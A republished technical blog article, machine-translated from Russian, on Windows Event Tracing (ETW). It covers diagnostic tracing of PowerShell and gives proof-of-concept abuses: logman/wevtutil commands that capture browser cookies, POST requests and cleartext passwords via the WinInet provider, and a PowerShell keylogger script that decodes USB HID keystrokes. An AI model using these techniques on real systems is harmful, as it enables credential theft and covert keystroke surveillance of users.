<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Event Tracing for Windows on the side of evil. But it is not exactly</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In previous articles about the sniffer on PowerShell and the collection of download data from a remote server, I already wrote a little about the poss...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Event Tracing for Windows on the side of evil. But it is not exactly</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/webt/ii/h9/zh/iih9zhmwsn9nofzy8rkouzp4yry.jpeg"></p><br><p>  In previous articles about the <a href="https://habr.com/company/pc-administrator/blog/333838/">sniffer on PowerShell</a> and the <a href="https://habr.com/company/pc-administrator/blog/336604/">collection of download data from a remote server,</a> I already wrote a little about the possibilities of ETW (Event Tracing for Windows).  Today I want to tell you more about this technology. </p><br><p>  At the same time I will show how to use HTTPS and create a keylogger on PowerShell, as an example.  Or not quite for good. <a name="habracut"></a></p><br><h1 id="rabota-s-etw">  Work with ETW </h1><br><p>  Event Tracing for Windows collects and sends messages from Windows system components and third-party applications.  It appeared back in the days of Windows 2000, but if at that time there were several dozen system providers, now they are already hundreds.  Messages are useful for diagnosing errors and solving problems with software performance. </p><br><p>  Some of the system providers, by default, are already writing to the Windows event log, and some are included separately.  So even if you do not know about ETW, you probably use it.  You can get acquainted with the logs and turn on some of them, if necessary, in the standard event viewer in the application and service logs.  A little about the magazine and about working with it can be found in the article ‚Äú <a href="https://habr.com/company/pc-administrator/blog/351594/">Verify Logs As We Want - Analysis of Logs on Windows Systems</a> ‚Äù. </p><br><p>  <strong>You can see the list of existing providers</strong> , who are only happy to tell us what is happening to them, with the command <strong>logman query providers</strong> . </p><br><p><img src="https://habrastorage.org/webt/l1/pj/bk/l1pjbkjfufxvyqp5ro4xv4qjyne.jpeg"></p><br><p>  <em>ETW providers.</em> </p><br><p>  You can view the list of providers that are connected to a specific Windows process (and thus learn something about it) using the <strong>logman query providers -pid &lt;process PID&gt;</strong> command <strong>.</strong> </p><br><p><img src="https://habrastorage.org/webt/f2/q3/is/f2q3is7egt-nmq70kkeoijqvrp0.jpeg"></p><br><p>  <em>List of providers connected to the usual notebook.</em> </p><br><p>  <strong>Subscribing to events of a</strong> specific provider or tracing can be enabled via PowerShell using the <strong>New-NetEventSession cmdlet</strong> .  Or you can click on the ‚ÄúComputer Management‚Äù - ‚ÄúPerformance‚Äù - ‚ÄúData Collector Groups‚Äù path.  Here in the event tracking sessions, you can see which traces are running, and if you wish, you can create your own collector. </p><br><p><img src="https://habrastorage.org/webt/gh/bx/qe/ghbxqepwh2ilmzzul7khowlivgo.jpeg"></p><br><p>  <em>Running traces.</em> </p><br><p>  <strong>You can view the result</strong> using utilities and toolkits such as <a href="https://www.microsoft.com/en-us/download/details.aspx%3Fid%3D44226">Microsoft Message Analyzer</a> , <a href="https://docs.microsoft.com/en-us/windows-hardware/test/wpt/">Windows Performance Toolkit,</a> or the <strong>Get-WinEvent</strong> PowerShell cmdlet. </p><br><p>  I recommend to familiarize with features of work of ETW in Microsoft documentation, it is possible to begin with the section <a href="https://docs.microsoft.com/en-us/windows/desktop/etw/about-event-tracing">About Event Tracing</a> .  I can also recommend a good material " <a href="https://kaimi.io/2017/03/etw-event-tracing-for-windows/">We study ETW and extract profits</a> ." </p><br><p>  Since ETW operates at the kernel level, it is distinguished by the message transfer rate and the absence of the need to install any drivers or injections into applications.  ETW is usually used to diagnose performance and application problems.  For example, in the article ‚Äú <a href="https://habr.com/post/106684/">Acceleration of Windows loading for fun and profit</a> ‚Äù, factors affecting the slowing down of loading are analyzed, and in the material <a href="https://randomascii.wordpress.com/2017/07/09/24-core-cpu-and-i-cant-move-my-mouse/">24-core CPU and I can't move my mouse</a> , the reasons for Windows slowing down on ordinary operations.  Let me give you an example - analysis of the launch of PowerShell cmdlets. </p><br><h1 id="sledim-za-powershell">  Watching PowerShell </h1><br><p>  Suppose that you somehow (for example, through process startup auditing) have discovered that vague processes and PowerShell scripts are running on the computer.  One technique would be to use ETW to analyze their activity.  For example, look at the PowerShell provider.  Enable tracing with the command: </p><br><pre><code class="bash hljs">logman start pstrace -p Microsoft-Windows-PowerShell -oc:\temp\pstrace.etl -ets</code> </pre> <br><p>  Now let's wait until the incomprehensible scripts work, stop the trace with the command: </p><br><pre> <code class="bash hljs">logman stop pstrace -ets</code> </pre><br><p>  Now you can see the trace, for example, through the Microsoft Message Analyzer. </p><br><p><img src="https://habrastorage.org/webt/3i/3j/7u/3i3j7uamctkk9-pd23lmtizdjcs.jpeg"></p><br><p>  <em>Suspicious clean.ps1 is obviously looking for something and deletes it.</em> </p><br><p>  If you select the desired line, then in the bottom panel there will be extended information about the event. </p><br><p><img src="https://habrastorage.org/webt/xk/tx/3t/xktx3thdkpitn0bueqhlaqmfx1k.jpeg"></p><br><p>  <em>And, this is a script to <a href="https://habr.com/company/pc-administrator/blog/320852/">clear the</a> 1C cache!</em> </p><br><p>  This time everything turned out to be banal.  But in more complex cases, you can start tracing to check other activities: </p><br><ul><li>  network activity; </li><li>  DNS resolution; </li><li>  disk access; </li><li>  work with memory; </li><li>  WMI activity; </li><li>  and much more. </li></ul><br><p>  Thus, ETW can help catch the malware and understand the operation of applications.  In some places it is more informative than the usual <a href="https://technet.microsoft.com/ru-ru/sysinternals/processmonitor.aspx">Process Monitor</a> .  But besides the good deeds, the mechanism has a ‚Äúdark‚Äù side. </p><br><blockquote>  Of course, you can kill with a hammer and save a gun.  Of course, I will not make a moral assessment of the mechanisms, but in any case, the possibilities are interesting. </blockquote><p>  I will give a couple of examples as a Proof-of-Concept. </p><br><h1 id="s--znachit-beeezopasno">  S - means safer </h1><br><p>  In this example, I will show how easy it is to find out what a user is looking for on the Internet, even over HTTPS.  You can watch without PowerShell - only a mouse, only hardcore.  In our task there will be a user, there will be Windows, Internet Explorer and an event log. </p><br><p>  Let's start by turning on the Wininet event log.  It is done this way: open the event log, on the ‚ÄúView‚Äù tab, enable the display of analytical and debug logs. </p><br><p><img src="https://habrastorage.org/webt/fu/de/q0/fudeq02mmzhunyyw1cwib0ou8pm.jpeg"></p><br><p>  <em>Add the display of the necessary logs.</em> </p><br><p>  After that, enable UsageLog in the context menu, and this is enough to get the necessary information.  We use IE and see the log: </p><br><p><img src="https://habrastorage.org/webt/pj/mu/ja/pjmujaesudek77i77sv0vtnnnjc.jpeg"></p><br><p>  <em>WinInet Journal.</em> </p><br><p>  Actually, in the journal headers and direct request to the search engine are visible. </p><br><p>  In addition to the headers with the help of the journal, you can also pull out a cookie, and at the same time look at POST requests - for example, to pull out the credentials.  The technique works on any applications that use wininet.dll to work with the Internet.  For example, the browser Edge. </p><br><p>  The same is easily implemented on PowerShell, and even on cmd.  I will give an example of the implementation last. </p><br><p>  First, create a trace: </p><br><pre> <code class="bash hljs">logman start CookieStealer -p Microsoft-Windows-WinInet -oc:\temp\cookiesteal.etl -ets</code> </pre><br><p>  Now let's work in the browser, check the mail.  After that you can stop the tracing with the command: </p><br><pre> <code class="bash hljs">logman stop CookieStealer -ets</code> </pre><br><p>  A simple analysis can be performed using the command utility <strong>wevtutil.exe</strong> .  For example, to view POST requests, the command would be: </p><br><pre> <code class="bash hljs">wevtutil qe c:\temp\cookiesteal.etl /lf:<span class="hljs-literal"><span class="hljs-literal">true</span></span> /f:Text | find /i <span class="hljs-string"><span class="hljs-string">"POST"</span></span></code> </pre><br><p>  You can even try at random to search for the word <em>password</em> and get a result. </p><br><p><img src="https://habrastorage.org/webt/yg/yk/gd/ygykgdj9vmqmlp7aobfcz5fyyiu.jpeg"></p><br><p>  <em>Clear text passwords.</em>  <em>Very annoying.</em> </p><br><p>  It is worth noting that the antivirus was silent.  Indeed, this is the usual tracing process. </p><br><p>  Of course, WinInet events can also be used to diagnose problems like "why this site does not open and what is happening at all."  But nevertheless, the possibilities are quite interesting.  Let me turn to an even more twisted example. </p><br><h1 id="keylogger-na-powershell-potomu-chto-mogu">  PowerShell Keylogger  Because I can. </h1><br><p>  There are two interesting ETW providers on Windows: </p><br><ul><li><p>  <strong>Microsoft-Windows-USB-UCX</strong> (36DA592D-E43A-4E28-AF6F-4BC57C5A11E8) - works with USB 2.0. </p><br></li><li><p>  <strong>Microsoft-Windows-USB-USBPORT</strong> (C88A4EF5-D048-4013-9408-E04B7DB2814A) - works with USB 3.0. </p><br></li></ul><br><p>  Using them, you can get the HID data that a USB device, such as a keyboard or mouse, transmits.  Data is captured in raw form, but thanks to <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf">the</a> HID <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf">specification,</a> it is quite possible to bring it to a readable form. </p><br><p>  To start a trace, just run the following commands: </p><br><pre> <code class="bash hljs">logman start <span class="hljs-string"><span class="hljs-string">"usbtrace"</span></span> -p <span class="hljs-string"><span class="hljs-string">"microsoft-windows-usb-usbport"</span></span> -o <span class="hljs-string"><span class="hljs-string">"c:\temp\usbtrace.etl"</span></span> -ets</code> </pre><br><p>  And the data can be obtained by the PowerShell cmdlet: </p><br><pre> <code class="hljs mel">$Input=get-winevent ‚Äìpath <span class="hljs-string"><span class="hljs-string">"c:\temp\usbtrace.etl"</span></span> ‚Äìoldest | where {$_.message ‚Äì<span class="hljs-keyword"><span class="hljs-keyword">match</span></span> <span class="hljs-string"><span class="hljs-string">"Data"</span></span>}</code> </pre><br><p>  I will give an example of a simple script that reads the trace data and converts it into readable values.  Conversion is done only for English letters and only in capital letters. </p><br><div class="spoiler">  <b class="spoiler_title">Full listing script under the spoiler.</b> <div class="spoiler_text"><pre> <code class="hljs bash"><span class="hljs-variable"><span class="hljs-variable">$source</span></span> = <span class="hljs-string"><span class="hljs-string">"C:\temp\trace.etl"</span></span> <span class="hljs-variable"><span class="hljs-variable">$destination</span></span>= <span class="hljs-string"><span class="hljs-string">"C:\temp\Output.txt"</span></span> <span class="hljs-variable"><span class="hljs-variable">$tracetime</span></span> = <span class="hljs-string"><span class="hljs-string">"10"</span></span> logman start usbtrace -p microsoft-windows-usb-usbport -o <span class="hljs-variable"><span class="hljs-variable">$source</span></span> -ets sleep <span class="hljs-variable"><span class="hljs-variable">$TraceTime</span></span> logman stop usbtrace -ets <span class="hljs-variable"><span class="hljs-variable">$Input</span></span>=get-winevent ‚Äìpath <span class="hljs-variable"><span class="hljs-variable">$Source</span></span> ‚Äìoldest | <span class="hljs-built_in"><span class="hljs-built_in">where</span></span> {<span class="hljs-variable"><span class="hljs-variable">$_</span></span>.message ‚Äìmatch <span class="hljs-string"><span class="hljs-string">"Data"</span></span>} <span class="hljs-variable"><span class="hljs-variable">$HID</span></span> = Foreach (<span class="hljs-variable"><span class="hljs-variable">$I</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-variable"><span class="hljs-variable">$Input</span></span>) {(<span class="hljs-string"><span class="hljs-string">'{0:x}'</span></span> -f (<span class="hljs-variable"><span class="hljs-variable">$I</span></span>.properties.value[5]))} <span class="hljs-variable"><span class="hljs-variable">$Data</span></span>=switch (<span class="hljs-variable"><span class="hljs-variable">$HID</span></span>) { 4 {<span class="hljs-string"><span class="hljs-string">"A"</span></span>} 5 {<span class="hljs-string"><span class="hljs-string">"B"</span></span>} 6 {<span class="hljs-string"><span class="hljs-string">"C"</span></span>} 7 {<span class="hljs-string"><span class="hljs-string">"D"</span></span>} 8 {<span class="hljs-string"><span class="hljs-string">"E"</span></span>} 9 {<span class="hljs-string"><span class="hljs-string">"F"</span></span>} A {<span class="hljs-string"><span class="hljs-string">"G"</span></span>} B {<span class="hljs-string"><span class="hljs-string">"H"</span></span>} C {<span class="hljs-string"><span class="hljs-string">"I"</span></span>} D {<span class="hljs-string"><span class="hljs-string">"J"</span></span>} E {<span class="hljs-string"><span class="hljs-string">"K"</span></span>} F {<span class="hljs-string"><span class="hljs-string">"L"</span></span>} 10 {<span class="hljs-string"><span class="hljs-string">"M"</span></span>} 11 {<span class="hljs-string"><span class="hljs-string">"N"</span></span>} 12 {<span class="hljs-string"><span class="hljs-string">"O"</span></span>} 13 {<span class="hljs-string"><span class="hljs-string">"P"</span></span>} 14 {<span class="hljs-string"><span class="hljs-string">"Q"</span></span>} 15 {<span class="hljs-string"><span class="hljs-string">"R"</span></span>} 16 {<span class="hljs-string"><span class="hljs-string">"S"</span></span>} 17 {<span class="hljs-string"><span class="hljs-string">"T"</span></span>} 18 {<span class="hljs-string"><span class="hljs-string">"U"</span></span>} 19 {<span class="hljs-string"><span class="hljs-string">"V"</span></span>} 1A {<span class="hljs-string"><span class="hljs-string">"W"</span></span>} 1B {<span class="hljs-string"><span class="hljs-string">"X"</span></span>} 1C {<span class="hljs-string"><span class="hljs-string">"Y"</span></span>} 1D {<span class="hljs-string"><span class="hljs-string">"Z"</span></span>} } <span class="hljs-variable"><span class="hljs-variable">$Data</span></span> | out-file <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$Destination</span></span></span><span class="hljs-string">"</span></span> get-content <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$Destination</span></span></span><span class="hljs-string">"</span></span> del <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$source</span></span></span><span class="hljs-string">"</span></span> del <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$Destination</span></span></span><span class="hljs-string">"</span></span></code> </pre> </div></div><br><p>  At startup, the script turns on tracing for 10 seconds, then shows the result. </p><br><p><img src="https://habrastorage.org/webt/w1/kg/ag/w1kgag36huygrqilju8ngooidx8.jpeg"></p><br><p>  <em>The result of the script.</em> </p><br><p>  Of course, having understood the HID data, you can modify the script to a full-fledged keylogger, which would record data from the keyboard and mouse.  It is worth noting the limitations of this mechanism: </p><br><ul><li>  works only with USB, and PS \ 2 (as is sometimes found in laptops) is not supported; </li><li>  USB 3.0 support is announced only in Windows 8 and higher; </li><li>  Administrator rights (UAC) are required. </li></ul><br><p>  But no drivers and interceptors.  Well, and of course, in addition to malicious use, such a keylogger can help in diagnosing problems with the keyboard.  In theory. </p><br><h1 id="nuzhno-li-boyatsya">  Do I need to be afraid </h1><br><p>  Even the built-in mechanisms in the hands of a villain can mess things up.  The methods of protection remain the same: block executable files from non-system directories, do not work as a user with administrator rights, and if they work, then at least do not disable UAC.  And, of course, the built-in security browsers for Windows raise questions. </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/418787/">https://habr.com/ru/post/418787/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../418777/index.html">‚ÄúThere is no boss here‚Äù: about working with Open Source and Apache Ignite in Sberbank Technologies</a></li>
<li><a href="../418779/index.html">Cash desk on the basis of the tablet: why does network retailers need it (we tell on the example of our cash desk)</a></li>
<li><a href="../418781/index.html">We add letter encryption and electronic signature to Zimbra</a></li>
<li><a href="../418783/index.html">‚ÄúWho was the monopoly giant yesterday, tomorrow may be nobody.‚Äù Interview with Evgeny Chereshnev from Biolink.Tech</a></li>
<li><a href="../418785/index.html">Amigo everything. Now it's official</a></li>
<li><a href="../418789/index.html">Uber stops developing unmanned trucks</a></li>
<li><a href="../418791/index.html">Oracles, or why smart contracts still have not changed the world?</a></li>
<li><a href="../418793/index.html">EXpert PDU - Power Distribution Expert</a></li>
<li><a href="../418795/index.html">ASUS ROG GM501 Zephyrus M Review</a></li>
<li><a href="../418797/index.html">Legal errors of IT projects when entering the US market</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>